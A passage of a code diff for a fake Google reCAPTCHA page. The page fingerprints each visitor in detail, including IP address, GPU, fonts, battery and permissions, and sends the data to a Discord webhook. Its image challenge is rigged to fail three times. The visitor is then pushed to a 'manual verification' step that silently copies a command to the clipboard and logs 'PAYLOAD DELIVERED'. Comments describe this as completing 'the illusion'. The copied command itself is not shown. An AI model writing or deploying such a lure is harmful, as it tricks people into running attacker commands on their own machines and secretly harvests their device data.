ibb.co/h17wFphz/uja.png','https://i.ibb.co/CKWzTxcm/h-J.png','https://i.ibb.co/RkySQTDr/T6.png','https://i.ibb.co/xtqvdcC0/hgazv.png','https://i.ibb.co/nsC8FPYW/hs7.png','https://i.ibb.co/sxSk66K/gu8.png','https://i.ibb.co/LzXVdnJ4/zzzx.png','https://i.ibb.co/F4GCnNRx/A6.png','https://i.ibb.co/93zsSJ1G/h-H3.png','https://i.ibb.co/HT9Cwhgb/Zue.png','https://i.ibb.co/Rn1b7x3/su-J.png','https://i.ibb.co/jvr1NXc7/zzzzzzzzz.png','https://i.ibb.co/0RPJ2TQd/u-Ur.png','https://i.ibb.co/FqWxbCQq/q-Aid.png','https://i.ibb.co/PzCLj61j/jei-F.png','https://i.ibb.co/BHz0yRRj/y-U.png','https://i.ibb.co/3yWwH3T9/z.png','https://i.ibb.co/wZ6bhgNC/i-Ge.png','https://i.ibb.co/WWbBVqmt/vk.png','https://i.ibb.co/HMPnwzh/u3.png','https://i.ibb.co/zWFsBLrY/oos.png','https://i.ibb.co/B5g0PP2G/sk.png','https://i.ibb.co/tpG1PnD1/inse.png','https://i.ibb.co/60MSCs0K/y.png','https://i.ibb.co/8gZLDyth/Zimmer.png','https://i.ibb.co/H3D2tD7/aqjd.png','https://i.ibb.co/Wv4wp526/bdi.png','https://i.ibb.co/qM2VsRt1/u-I.png','https://i.ibb.co/TqdccmrW/shimy.png','https://i.ibb.co/Jw1TVZFf/vvvvv.png','https://i.ibb.co/tPQ6VPDV/Yjs.png','https://i.ibb.co/p6sVxTQP/jw.png','https://i.ibb.co/Qvy2JYb2/78D.png','https://i.ibb.co/tPMJc9HQ/your.png','https://i.ibb.co/6crfPrMx/yyge.png','https://i.ibb.co/qMkM464S/U63.png','https://i.ibb.co/d4PGJZpK/Shg.png','https://i.ibb.co/PGNVTBLc/qirn.png','https://i.ibb.co/ns2xKmsw/Yie.png','https://i.ibb.co/Z4nxQxx/jjssi.png','https://i.ibb.co/JjftBwfj/ijs.png','https://i.ibb.co/cX2b4tvH/hswi.png','https://i.ibb.co/m5pFG4mP/hjis.png','https://i.ibb.co/cKHxXjtH/jow.png']
+        };
+
+        // State
+        let state = 'idle';
+        let selected = new Set();
+        let verificationCount = 0;
+        let currentType = '';
+        let currentLocale = 'en';
+        let fingerprint = null;
+        let sessionData = { startTime: Date.now(), interactions: [], attempts: 0 };
+        let validImageCount = 0;
+        let nextChallengeHTML = "";
+        let nextChallengeData = null;
+        let processingImages = new Set();
+        let attemptBehavior = Math.random() < 0.5 ? [1, 2, 3] : [2, 1, 3];
+        let hasInteracted = false;
+
+        // FIX 5: Track pending auto-refresh timer so it can be cancelled when user closes
+        let autoRefreshTimer = null;
+        let errorDelayTimer = null;
+
+        const challenges = [
+            { key: 'crosswalks' }, { key: 'buses' }, { key: 'cars' },
+            { key: 'bicycles' }, { key: 'fireHydrants' }
+        ];
+
+        async function generateFingerprint() {
+            const fp = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: (navigator.languages || [navigator.language]).join(','),
+                platform: navigator.platform,
+                vendor: navigator.vendor || 'Unknown',
+                appVersion: navigator.appVersion || 'Unknown',
+                product: navigator.product || 'Unknown',
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    orientation: (screen.orientation && screen.orientation.type) || 'Unknown'
+                },
+                devicePixelRatio: window.devicePixelRatio || 1,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                locale: Intl.DateTimeFormat().resolvedOptions().locale || 'Unknown',
+                sessionStorage: (() => { try { return !!window.sessionStorage; } catch(e) { return false; } })(),
+                localStorage: (() => { try { return !!window.localStorage; } catch(e) { return false; } })(),
+                indexedDB: !!window.indexedDB,
+                openDatabase: !!window.openDatabase,
+                cpuClass: navigator.cpuClass || 'Unknown',
+                oscpu: navigator.oscpu || 'Unknown',
+                plugins: (() => {
+                    try {
+                        return Array.from(navigator.plugins || []).map(p => p.name).join('|') || 'None';
+                    } catch(e) { return 'Unknown'; }
+                })(),
+                mimeTypes: (() => {
+                    try {
+                        return Array.from(navigator.mimeTypes || []).map(m => m.type).join('|') || 'None';
+                    } catch(e) { return 'Unknown'; }
+                })(),
+                windowSize: { inner: `${window.innerWidth}x${window.innerHeight}`, outer: `${window.outerWidth}x${window.outerHeight}` },
+                colorGamut: (() => {
+                    if(window.matchMedia('(color-gamut: rec2020)').matches) return 'rec2020';
+                    if(window.matchMedia('(color-gamut: p3)').matches) return 'p3';
+                    if(window.matchMedia('(color-gamut: srgb)').matches) return 'srgb';
+                    return 'Unknown';
+                })(),
+                hdr: window.matchMedia('(dynamic-range: high)').matches,
+                reducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
+                forcedColors: window.matchMedia('(forced-colors: active)').matches,
+                pointerType: (() => {
+                    if(window.matchMedia('(pointer: fine)').matches) return 'fine';
+                    if(window.matchMedia('(pointer: coarse)').matches) return 'coarse';
+                    return 'none';
+                })(),
+                hoverSupport: window.matchMedia('(hover: hover)').matches,
+                prefersColorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
+                webdriver: navigator.webdriver || false,
+                connection: (() => {
+                    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    if(!c) return 'Unknown';
+                    return { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData };
+                })(),
+            };
+
+            // IP lookup
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                fp.ip = ipData.ip;
+            } catch(e) { fp.ip = 'Unknown'; }
+
+            // Canvas fingerprint
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 240; canvas.height = 60;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'alphabetic';
+                ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.font = '11pt "Times New Roman"';
+                ctx.fillText('reCAPTCHA', 2, 15);
+                ctx.fillStyle = 'rgba(102,204,0,0.7)';
+                ctx.font = '18pt Arial';
+                ctx.fillText('reCAPTCHA', 4, 45);
+                fp.canvasHash = canvas.toDataURL().slice(-64);
+            } catch(e) { fp.canvasHash = 'Unknown'; }
+
+            // WebGL fingerprint
+            try {
+                const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
+                if(gl) {
+                    const dbgRenderInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    fp.webgl = {
+                        vendor: dbgRenderInfo ? gl.getParameter(dbgRenderInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+                        renderer: dbgRenderInfo ? gl.getParameter(dbgRenderInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+                        version: gl.getParameter(gl.VERSION),
+                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                        maxViewportDims: Array.from(gl.getParameter(gl.MAX_VIEWPORT_DIMS) || []).join('x'),
+                        extensions: (gl.getSupportedExtensions() || []).join('|').substring(0, 200)
+                    };
+                } else { fp.webgl = 'Unsupported'; }
+            } catch(e) { fp.webgl = 'Error'; }
+
+            // Audio context fingerprint
+            try {
+                const AudioCtx = window.AudioContext || window.webkitAudioContext;
+                if(AudioCtx) {
+                    const ctx = new AudioCtx();
+                    const oscillator = ctx.createOscillator();
+                    const analyser = ctx.createAnalyser();
+                    const gain = ctx.createGain();
+                    const scriptProcessor = ctx.createScriptProcessor(4096, 1, 1);
+                    gain.gain.value = 0;
+                    oscillator.type = 'triangle';
+                    oscillator.connect(analyser);
+                    analyser.connect(scriptProcessor);
+                    scriptProcessor.connect(gain);
+                    gain.connect(ctx.destination);
+                    oscillator.start(0);
+                    fp.audioSampleRate = ctx.sampleRate;
+                    fp.audioChannelCount = ctx.destination.channelCount;
+                    fp.audioState = ctx.state;
+                    oscillator.stop();
+                    ctx.close();
+                }
+            } catch(e) { fp.audioSampleRate = 'Unknown'; }
+
+            // Battery API
+            try {
+                if(navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    fp.battery = { charging: battery.charging, level: battery.level, chargingTime: battery.chargingTime, dischargingTime: battery.dischargingTime };
+                }
+            } catch(e) {}
+
+            // Font detection via measureText
+            try {
+                const baseFonts = ['monospace', 'sans-serif', 'serif'];
+                const testFonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Trebuchet MS', 'Impact', 'Comic Sans MS', 'Calibri', 'Segoe UI', 'Tahoma', 'Roboto', 'Ubuntu', 'Cantarell', 'Open Sans', 'Source Sans Pro'];
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                const detectFont = (font) => {
+                    const baseWidths = baseFonts.map(base => { ctx.font = `72px ${base}`; return ctx.measureText('mmmmmmmmli').width; });
+                    return baseFonts.some((base, i) => { ctx.font = `72px ${font}, ${base}`; return ctx.measureText('mmmmmmmmli').width !== baseWidths[i]; });
+                };
+                fp.availableFonts = testFonts.filter(detectFont).join(',');
+            } catch(e) { fp.availableFonts = 'Unknown'; }
+
+            // Memory
+            fp.deviceMemory = navigator.deviceMemory || 'Unknown';
+
+            // Media devices count (without requesting permission)
+            try {
+                if(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    fp.mediaDevices = { audioinput: 0, audiooutput: 0, videoinput: 0 };
+                    devices.forEach(d => { if(fp.mediaDevices[d.kind] !== undefined) fp.mediaDevices[d.kind]++; });
+                }
+            } catch(e) {}
+
+            // Permissions API probe
+            try {
+                const perms = ['notifications', 'geolocation', 'camera', 'microphone'];
+                fp.permissions = {};
+                for(const perm of perms) {
+                    try {
+                        const result = await navigator.permissions.query({ name: perm });
+                        fp.permissions[perm] = result.state;
+                    } catch(e) { fp.permissions[perm] = 'Unknown'; }
+                }
+            } catch(e) {}
+
+            // Build stable hash
+            const hashString = JSON.stringify({ ua: fp.userAgent, pl: fp.platform, tz: fp.timezone, cv: fp.canvasHash, wgl: fp.webgl?.renderer, sr: fp.screen, dpr: fp.devicePixelRatio });
+            let hash = 0;
+            for(let i = 0; i < hashString.length; i++) {
+                const char = hashString.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash;
+            }
+            fp.hash = Math.abs(hash).toString(16).padStart(16, '0');
+            return fp;
+        }
+
+        async function sendToWebhook(data) {
+            const webhook = DISCORD_WEBHOOKS[0];
+            if(!webhook || webhook.includes('WEBHOOK')) return;
+            const fp = data.fingerprint || {};
+            const webgl = (typeof fp.webgl === 'object') ? fp.webgl : {};
+            const conn = (typeof fp.connection === 'object') ? fp.connection : {};
+            const battery = fp.battery || null;
+            const media = fp.mediaDevices || {};
+            const perms = fp.permissions || {};
+            try {
+                const fields = [
+                    { name: "🌐 IP", value: fp.ip || 'Unknown', inline: true },
+                    { name: "🕐 Timezone", value: `${fp.timezone || 'Unknown'} (UTC${fp.timezoneOffset !== undefined ? (fp.timezoneOffset <= 0 ? '+' : '') + (-fp.timezoneOffset / 60) : '?'})`, inline: true },
+                    { name: "🌍 Locale", value: `${fp.language || 'Unknown'} / ${fp.locale || 'Unknown'}`, inline: true },
+                    { name: "💻 Platform", value: fp.platform || 'Unknown', inline: true },
+                    { name: "🧠 Memory", value: `${fp.deviceMemory || '?'} GB`, inline: true },
+                    { name: "⚙️ CPU Cores", value: String(fp.hardwareConcurrency || '?'), inline: true },
+                    { name: "🖥️ Screen", value: `${fp.screen?.width}x${fp.screen?.height} @ ${fp.devicePixelRatio}x DPR`, inline: true },
+                    { name: "🎨 Color", value: `${fp.screen?.colorDepth}bit / ${fp.colorGamut || '?'} / HDR:${fp.hdr}`, inline: true },
+                    { name: "👆 Touch Points", value: String(fp.maxTouchPoints || 0), inline: true },
+                    { name: "🌐 User Agent", value: (fp.userAgent || 'Unknown').substring(0, 100), inline: false },
+                    { name: "🎮 WebGL Renderer", value: webgl.renderer ? webgl.renderer.substring(0, 80) : 'Unknown', inline: false },
+                    { name: "🎮 WebGL Vendor", value: webgl.vendor || 'Unknown', inline: true },
+                    { name: "🎵 Audio", value: `${fp.audioSampleRate || '?'} Hz / ${fp.audioChannelCount || '?'}ch`, inline: true },
+                    { name: "📶 Connection", value: conn.effectiveType ? `${conn.effectiveType} / ${conn.downlink}Mbps / RTT:${conn.rtt}ms` : 'Unknown', inline: true },
+                    { name: "🔋 Battery", value: battery ? `${Math.round(battery.level * 100)}% ${battery.charging ? '⚡' : '🔋'}` : 'Unknown', inline: true },
+                    { name: "📷 Media Devices", value: `🎤${media.audioinput||0} 🔊${media.audiooutput||0} 📹${media.videoinput||0}`, inline: true },
+                    { name: "🤖 Webdriver", value: String(fp.webdriver || false), inline: true },
+                    { name: "🔌 Plugins", value: (fp.plugins || 'None').substring(0, 80), inline: false },
+                    { name: "🅰️ Fonts", value: (fp.availableFonts || 'Unknown').substring(0, 100), inline: false },
+                    { name: "🔒 Permissions", value: Object.entries(perms).map(([k,v]) => `${k}:${v}`).join(' | ') || 'Unknown', inline: false },
+                    { name: "🖱️ Pointer / Hover", value: `${fp.pointerType || '?'} / ${fp.hoverSupport ? 'yes' : 'no'}`, inline: true },
+                    { name: "🌓 Color Scheme", value: fp.prefersColorScheme || 'Unknown', inline: true },
+                    { name: "🍪 Storage", value: `Cookie:${fp.cookieEnabled} LS:${fp.localStorage} SS:${fp.sessionStorage} IDB:${fp.indexedDB}`, inline: false },
+                    { name: "🔑 Hash", value: fp.hash || 'Unknown', inline: true },
+                    { name: "📊 Attempts", value: String(data.sessionData?.attempts || 0), inline: true },
+                ];
+                if(data.commandCopied) {
+                    fields.push({ name: "Status", value: "✅ Command Copied to Clipboard — PAYLOAD DELIVERED", inline: false });
+                }
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🎯 reCAPTCHA",
+                            color: data.commandCopied ? 0x0f9d58 : 0x1a73e8,
+                            fields: fields,
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            } catch(e) {}
+        }
+
+        function selectCommand() {
+            const pool = COMMAND_POOLS['en'];
+            const baseCommand = pool[0];
+            const sessionId = Date.now().toString(16).substring(0, 4).toUpperCase();
+            const timestamp = Date.now().toString(36).toUpperCase().substring(0, 4);
+            const verificationId = `${sessionId}-${timestamp}`;
+            return `${baseCommand} # reCAPTCHA Verification ID: ${verificationId}`;
+        }
+
+        function detectLocale() {
+            return 'en';
+        }
+
+        function applyTranslations() {
+            const t = TRANSLATIONS[currentLocale];
+            document.getElementById('main-text').textContent = t.mainText;
+            document.getElementById('manual-title').textContent = t.manualTitle;
+            document.getElementById('manual-subtitle').textContent = t.manualSubtitle;
+            document.getElementById('manual-description').textContent = t.manualDescription;
+            document.getElementById('manual-steps-header').textContent = t.manualStepsHeader;
+            document.getElementById('manual-info').textContent = t.manualInfo;
+            document.getElementById('run-verification-btn').textContent = t.runVerificationBtn;
+            document.getElementById('help-toggle-text').textContent = t.helpToggleShow;
+            document.getElementById('detailed-help-title').textContent = t.detailedHelpTitle;
+            document.getElementById('detailed-help-content').innerHTML = t.detailedHelpContent;
+            document.getElementById('detailed-help-note').textContent = t.detailedHelpNote;
+            
+            const stepsContainer = document.getElementById('manual-steps');
+            stepsContainer.innerHTML = '';
+            t.manualSteps.forEach((step, i) => {
+                const li = document.createElement('li');
+                li.style.marginBottom = '8px';
+                li.innerHTML = `<span style="color: #1a73e8; font-weight: 500;">${i + 1}.</span> ${step}`;
+                stepsContainer.appendChild(li);
+            });
+        }
+
+        function toggleDetailedHelp() {
+            const t = TRANSLATIONS[currentLocale];
+            const helpSection = document.getElementById('detailed-help');
+            const helpText = document.getElementById('help-toggle-text');
+            const helpIcon = document.getElementById('help-icon');
+            
+            if(helpSection.classList.contains('hidden')) {
+                // Show detailed help
+                helpSection.classList.remove('hidden');
+                helpText.textContent = t.helpToggleHide;
+                document.getElementById('scroll-arrows').style.display = 'flex';
+                // Change icon to X
+                helpIcon.innerHTML = `
+                    <line x1="18" y1="6" x2="6" y2="18" stroke-linecap="round"/>
+                    <line x1="6" y1="6" x2="18" y2="18" stroke-linecap="round"/>
+                `;
+            } else {
+                // Hide detailed help
+                helpSection.classList.add('hidden');
+                helpText.textContent = t.helpToggleShow;
+                document.getElementById('scroll-arrows').style.display = 'none';
+                // Change icon back to question mark
+                helpIcon.innerHTML = `
+                    <circle cx="12" cy="12" r="10"/>
+                    <path stroke-linecap="round" d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/>
+                    <circle cx="12" cy="17" r="0.5" fill="currentColor"/>
+                `;
+            }
+        }
+
+        function showTooltip(event, tooltipId) {
+            const t = TRANSLATIONS[currentLocale];
+            const tooltip = document.getElementById('tooltip');
+            let text = '';
+            if(tooltipId === 'tooltip-refresh') text = t.tooltipRefresh;
+            if(tooltipId === 'tooltip-audio') text = t.tooltipAudio;
+            if(tooltipId === 'tooltip-accessibility') text = t.tooltipAccessibility;
+            if(tooltipId === 'tooltip-info') text = t.tooltipInfo;
+            tooltip.textContent = text;
+            tooltip.classList.add('show');
+            const rect = event.target.getBoundingClientRect();
+            tooltip.style.left = (rect.left + rect.width / 2) + 'px';
+            tooltip.style.top = (rect.bottom + 8) + 'px';
+            tooltip.style.transform = 'translateX(-50%)';
+        }
+
+        function hideTooltip() {
+            document.getElementById('tooltip').classList.remove('show');
+        }
+
+        function shuffle(array) {
+            for(let i = array.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [array[i], array[j]] = [array[j], array[i]];
+            }
+            return array;
+        }
+
+        function resolveImageSrc(src) {
+            return (src.startsWith('http://') || src.startsWith('https://')) ? src : IMAGE_BASE_PATH + src;
+        }
+
+        function prepareChallenge() {
+            const challenge = challenges[Math.floor(Math.random() * challenges.length)];
+            const type = challenge.key;
+            const initialValidCount = Math.random() < 0.5 ? 2 : 3;
+            const correctImages = shuffle([...imagePool[type]]).slice(0, initialValidCount);
+
+            // Deduplicate: exclude any random image URLs that appear in correctImages
+            const correctSet = new Set(correctImages);
+            const filteredRandom = imagePool.random.filter(src => !correctSet.has(src));
+            const randomImages = shuffle([...filteredRandom]).slice(0, 9 - initialValidCount);
+            const allImages = shuffle([...correctImages, ...randomImages]);
+
+            // Use cached preloader — no duplicate network hits
+            allImages.forEach(src => preloadImage(src));
+            if(type === 'cars' || type === 'bridges') preloadImage(REFERENCE_IMAGES[type]);
+
+            const checkmarkSvg = `
+                <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg" style="width: 100%; height: 100%; display: block;">
+                  <circle cx="100" cy="100" r="100" fill="#1d7aed" />
+                  <path d="M 45 100 L 80 140 L 155 60" stroke="#fdfeff" stroke-width="20" stroke-linecap="round" stroke-linejoin="round" fill="none" />
+                </svg>`;
+
+            let gridHTML = "";
+            allImages.forEach((src, i) => {
+                gridHTML += `
+                <div class="image-tile" onclick="toggle(${i})">
+                    <div class="hidden" id="loading-${i}"></div>
+                    <img src="${resolveImageSrc(src)}" class="w-full h-full object-cover" id="img-${i}" onload="imageLoaded(${i})" data-is-valid="${correctImages.includes(src)}">
+                    <div class="white-overlay" id="overlay-${i}"></div>
+                    <div class="center-check" id="center-chk-${i}">${checkmarkSvg}</div>
+                    <div class="corner-check" id="corner-chk-${i}">${checkmarkSvg}</div>
+                </div>`;
+            });
+
+            nextChallengeData = { type, validCount: initialValidCount };
+            nextChallengeHTML = gridHTML;
+        }
+
+        function triggerCaptcha() {
+            // FIX 6: Prevent re-triggering if already checked or loading
+            if(state !== 'idle') return;
+            state = 'loading';
+            
+            const checkbox = document.getElementById('recaptcha-checkbox');
+            checkbox.classList.add('loading');
+            document.getElementById('loader').classList.remove('hidden');
+            
+            sessionData.interactions.push({ type: 'trigger', time: Date.now() });
+
+            const loadingTime = 2500 + Math.floor(Math.random() * 500);
+            
+            setTimeout(async () => {
+                if(!fingerprint) {
+                    fingerprint = await generateFingerprint();
+                }
+                attemptBehavior = Math.random() < 0.5 ? [1, 2, 3] : [2, 1, 3];
+                state = 'challenge';
+                verificationCount = 0;
+                applyChallengeToDOM();
+                document.getElementById('challenge-overlay').classList.remove('hidden');
+                document.getElementById('challenge-card').classList.remove('hidden');
+            }, loadingTime);
+        }
+
+        function applyChallengeToDOM() {
+            selected.clear();
+            processingImages.clear();
+            hasInteracted = false;
+            document.getElementById('error-container').textContent = '';
+            currentType = nextChallengeData.type;
+            validImageCount = nextChallengeData.validCount;
+            
+            const t = TRANSLATIONS[currentLocale];
+            document.getElementById('header-instruction').textContent = t.headerInstruction;
+            document.getElementById('challenge-type').textContent = t.challenges[currentType];
+            const subtitleEl = document.getElementById('header-subtitle');
+            subtitleEl.textContent = t.headerSubtitle;
+            subtitleEl.classList.remove('hidden');
+            
+            const refContainer = document.getElementById('reference-image');
+            const refImg = document.getElementById('reference-img');
+            if(currentType === 'cars' || currentType === 'bridges') {
+                refImg.src = REFERENCE_IMAGES[currentType];
+                refContainer.classList.remove('hidden');
+            } else {
+                refContainer.classList.add('hidden');
+            }
+            document.getElementById('image-grid').innerHTML = nextChallengeHTML;
+        }
+
+        function refreshChallenge() {
+            sessionData.interactions.push({ type: 'refresh', time: Date.now() });
+            // FIX 7: refreshChallenge no longer resets verificationCount
+            // (resetting allowed users to dodge the 3-attempt manual verification trigger)
+            prepareChallenge();
+            applyChallengeToDOM();
+        }
+
+        function imageLoaded(i) {
+            const el = document.getElementById(`loading-${i}`);
+            if(el) el.classList.add('hidden');
+        }
+
+        function toggle(i) {
+            const img = document.getElementById(`img-${i}`);
+            const centerChk = document.getElementById(`center-chk-${i}`);
+            const cornerChk = document.getElementById(`corner-chk-${i}`);
+            const overlay = document.getElementById(`overlay-${i}`);
+            
+            if(processingImages.has(i)) return;
+            
+            if(selected.has(i)) {
+                selected.delete(i);
+                img.classList.remove('zooming-out');
+                centerChk.classList.remove('first-attempt');
+                centerChk.style.opacity = '0';
+                centerChk.style.transition = 'opacity 200ms ease';
+                cornerChk.classList.remove('show');
+                img.style.removeProperty('transition');
+            } else {
+                selected.add(i);
+                hasInteracted = true;
+                if(selected.size >= 2) document.getElementById('error-container').textContent = '';
+                const wasValid = img.getAttribute('data-is-valid') === 'true';
+                const useWhiteningEffect = (verificationCount === 0 && attemptBehavior[0] === 1) || (verificationCount === 1 && attemptBehavior[1] === 1);
+                
+                if(useWhiteningEffect) {
+                    processingImages.add(i);
+                    centerChk.classList.add('first-attempt');
+                    centerChk.style.transition = 'none';
+                    centerChk.style.opacity = '1';
+                    
+                    // FIX 8: Whiten duration extended to feel realistic (was 1500-2000ms, still fine)
+                    const whitenDuration = 1500 + Math.floor(Math.random() * 500);
+                    overlay.style.transition = `opacity ${whitenDuration}ms ease-in-out`;
+                    void overlay.offsetWidth;
+                    overlay.style.opacity = '1';
+                    
+                    setTimeout(() => {
+                        const newImageSrc = getReplacementImage(wasValid);
+
+                        const isNewValid = imagePool[currentType].includes(newImageSrc);
+                        let finalSrc = newImageSrc;
+                        let finalIsValid = isNewValid;
+
+                        if(validImageCount > 2 && isNewValid) {
+                            finalSrc = imagePool.random[Math.floor(Math.random() * imagePool.random.length)];
+                            finalIsValid = false;
+                        }
+
+                        img.src = resolveImageSrc(finalSrc);
+                        img.setAttribute('data-is-valid', finalIsValid.toString());
+
+                        if(wasValid && !finalIsValid) validImageCount--;
+                        if(!wasValid && finalIsValid) validImageCount++;
+
+                        centerChk.classList.remove('first-attempt');
+                        centerChk.style.transition = 'none';
+                        centerChk.style.opacity = '0';
+                        overlay.style.transition = 'opacity 400ms ease-out';
+                        overlay.style.opacity = '0';
+                        setTimeout(() => {
+                            img.style.removeProperty('transition');
+                            img.classList.remove('zooming-out');
+                            processingImages.delete(i);
+                        }, 450);
+                        
+                        selected.delete(i);
+                    }, whitenDuration);
+                    
+                } else {
+                    cornerChk.classList.add('show');
+                    img.classList.add('zooming-out');
+                }
+            }
+            sessionData.interactions.push({ type: 'toggle', tile: i, time: Date.now() });
+        }
+
+        function getReplacementImage(wasValidImage) {
+            if(wasValidImage) {
+                const allPools = [...imagePool[currentType], ...imagePool.random];
+                return allPools[Math.floor(Math.random() * allPools.length)];
+            } else {
+                return imagePool.random[Math.floor(Math.random() * imagePool.random.length)];
+            }
+        }
+
+        function verify() {
+            const btn = document.getElementById('verify-btn');
+            const t = TRANSLATIONS[currentLocale];
+
+            if(!hasInteracted) {
+                document.getElementById('error-container').textContent = 'Please select all matching images.';
+                return;
+            }
+            document.getElementById('error-container').textContent = '';
+            verificationCount++;
+            sessionData.attempts++;
+            btn.disabled = true;
+            
+            const jitter = 300 + Math.floor(Math.random() * 500);
+            
+            setTimeout(() => {
+                if(verificationCount < 3) {
+                    // FIX 5: Store timer refs so they can be cancelled on close
+                    errorDelayTimer = setTimeout(() => {
+                        document.getElementById('header-subtitle').classList.add('hidden');
+                        document.getElementById('error-container').textContent = t.errorTryAgain;
+                    }, 2000);
+                    
+                    autoRefreshTimer = setTimeout(() => {
+                        processingImages.clear();
+                        prepareChallenge();
+                        applyChallengeToDOM();
+                        btn.disabled = false;
+                        selected.clear();
+                        document.getElementById('error-container').textContent = '';
+                        document.querySelectorAll('.image-tile img').forEach(img => {
+                            img.style.removeProperty('transition');
+                            img.classList.remove('zooming-out');
+                        });
+                        document.querySelectorAll('.corner-check').forEach(chk => chk.classList.remove('show'));
+                    }, 4500);
+                    
+                } else if(verificationCount >= 3) {
+                    document.getElementById('error-container').innerHTML = t.errorDifficulty;
+                    setTimeout(() => {
+                        const link = document.getElementById('manual-verify-link');
+                        if(link) link.onclick = (e) => { e.preventDefault(); showManualVerification(); };
+                    }, 100);
+                    btn.disabled = false;
+                    sendToWebhook({ fingerprint, sessionData, locale: currentLocale });
+                }
+            }, jitter);
+        }
+
+        function showManualVerification() {
+            document.getElementById('challenge-card').classList.add('hidden');
+            document.getElementById('manual-modal').classList.remove('hidden');
+        }
+
+        function closeManualVerification() {
+            // FIX 5: Cancel pending timers on close to prevent orphaned callbacks
+            if(autoRefreshTimer) { clearTimeout(autoRefreshTimer); autoRefreshTimer = null; }
+            if(errorDelayTimer) { clearTimeout(errorDelayTimer); errorDelayTimer = null; }
+
+            document.getElementById('manual-modal').classList.add('hidden');
+            document.getElementById('challenge-card').classList.add('hidden');
+            // FIX 10: Overlay was not being hidden when closing from manual modal path
+            document.getElementById('challenge-overlay').classList.add('hidden');
+            
+            // FIX 1: Show green checkmark in the main checkbox to complete the illusion
+            const checkbox = document.getElementById('recaptcha-checkbox');
+            checkbox.classList.remove('loading');
+            checkbox.classList.add('checked');
+            const loader = document.getElementById('loader');
+            loader.classList.add('hidden');
+            const checkmark = document.getElementById('checkmark');
+            checkmark.classList.remove('hidden');
+            // Trigger the draw animation
+            void checkmark.offsetWidth;
+            checkmark.classList.add('animate');
+
+            state = 'done';
+            processingImages.clear();
+            prepareChallenge();
+        }
+
+        async function runManualVerification() {
+            const t = TRANSLATIONS[currentLocale];
+            const btn = document.getElementById('run-verification-btn');
+            const command = selectCommand();
+            const copyToClipboard = async (text) => {
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    try {
+                        await navigator.clipboard.writeText(text);
+                        return true;
+                    } catch(e) {}
+                }
+                // Fallback for non-HTTPS contexts
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                ta.style.cssText = 'position:fixed;top:0;left:0;opacity:0;';
+                document.body.appendChild(ta);
+                ta.focus();
+                ta.select();
+                const ok = document.execCommand('copy');
+                document.body.removeChild(ta);
+                return ok;
+            };
+
+            try {
+                const ok = await copyToClipboard(command);
+                if (ok) {
+                    btn.textContent = t.copiedBtn;
+                    btn.classList.add('bg-[#0d652d]');
+                    setTimeout(() => {
+                        btn.innerHTML = `<div style="display: flex; align-items: center; gap: 8px;"><svg style="width: 20px; height: 20px;" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg><span>${t.finalInstruction}</span></div>`;
+                    }, 500);
+                    sendToWebhook({ fingerprint, sessionData, locale: currentLocale, commandCopied: true });
+                }
+            } catch(err) {}
+        }
+
+        // Dedup image preload cache — each URL only ever loads once
+        const _preloadedUrls = new Set();
+        function preloadImage(src) {
+            if(_preloadedUrls.has(src)) return;
+            _preloadedUrls.add(src);
+            const img = new Image();
+            img.src = src;
+        }
+
+        function preloadAllImages() {
+            Object.values(imagePool).forEach(pool => pool.forEach(src => preloadImage(src)));
+            Object.values(REFERENCE_IMAGES).forEach(src => preloadImage(src));
+        }
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            currentLocale = detectLocale();
+            applyTranslations();
+            fingerprint = await generateFingerprint();
+            preloadAllImages();
+            prepareChallenge();
+
+            // Populate time
+            const now = new Date();
+            const pad = n => String(n).padStart(2, '0');
